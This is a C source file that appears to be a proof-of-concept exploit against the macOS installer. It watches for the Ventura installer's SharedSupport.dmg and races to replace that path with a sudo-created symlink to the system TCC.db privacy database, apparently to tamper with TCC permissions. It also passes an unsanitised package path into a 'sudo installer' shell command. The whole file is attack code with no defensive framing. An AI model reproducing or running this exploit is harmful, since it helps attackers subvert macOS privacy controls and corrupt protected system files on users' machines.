#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <pthread.h>

#define MAX_THREADS 2

char *SHARED_SUPPORT_PATH = "/Applications/Install macOS Ventura.app/Contents/SharedSupport/SharedSupport.dmg";
volatile int file_created = 0;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

char *TARGET_FILE = "/Library/Application Support/com.apple.TCC/TCC.db";
char symlink_cmd[256];

void *monitor_file_creation(void *arg) {
    pthread_mutex_lock(&mutex);
    while (!file_created) {
        struct stat buffer;
        if (stat(SHARED_SUPPORT_PATH, &buffer) == 0) {
            pthread_mutex_unlock(&mutex);
            file_created = 1;
            printf("[*] File created!\n");
            break;
        }
    }
    return NULL;
}

void *create_symlink(void *arg) {
    pthread_mutex_lock(&mutex);
    //printf("[*] creating the symlink...\n");
    if (system(symlink_cmd) == 0) {
        printf("[+] symlink [%s] -> [%s] created successfully!\n", SHARED_SUPPORT_PATH, TARGET_FILE);
    } else {
        printf("[-] failed to create symlink [%s] -> [%s]\n", SHARED_SUPPORT_PATH, TARGET_FILE);
    }
    pthread_mutex_unlock(&mutex);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc == 1) {
        printf("No arguments provided. Usage: %s <PKG_PATH>\n", argv[0]);
        return 1;
    }

    printf("[*] preparing the environment...\n");
    char *PKG_PATH = argv[1];
    sprintf(symlink_cmd, "sudo ln -sf \"%s\" \"%s\"", TARGET_FILE, SHARED_SUPPORT_PATH);

    pthread_t threads[MAX_THREADS];

    pthread_create(&threads[0], NULL, monitor_file_creation, NULL);
    pthread_create(&threads[1], NULL, create_symlink, NULL);

    char installer_cmd[256];
    sprintf(installer_cmd, "sudo installer -pkg %s -target / &", PKG_PATH);
    system(installer_cmd);

    pthread_join(threads[0], NULL);
    pthread_join(threads[1], NULL);

    pthread_mutex_destroy(&mutex);

    printf("[*] all done. enjoy :P\n");
    return 0;
}
